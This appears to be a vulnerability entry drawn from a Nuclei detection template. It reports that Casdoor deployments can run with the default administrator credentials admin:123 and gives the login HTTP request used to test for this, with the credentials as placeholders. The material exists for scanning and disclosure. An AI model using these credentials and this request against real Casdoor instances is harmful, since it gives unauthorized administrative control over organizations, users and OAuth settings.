# Vulnerability: Casdoor - Default Admin Credentials
**Classification:** CASDOOR
**Source:** Nuclei Template (`casdoor-default-login.yaml`)

## Description
Detected Casdoor platform was found to have been using the default administrator credentials (admin:123). An attacker could have gained full administrative access to manage organizations, users, applications, and OAuth providers.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /api/login HTTP/1.1
Host: {{Hostname}}

{"application":"app-built-in","organization":"built-in","username":"{{username}}","password":"{{password}}","autoSignin":true,"signinMethod":"Password","type":"login"}
```

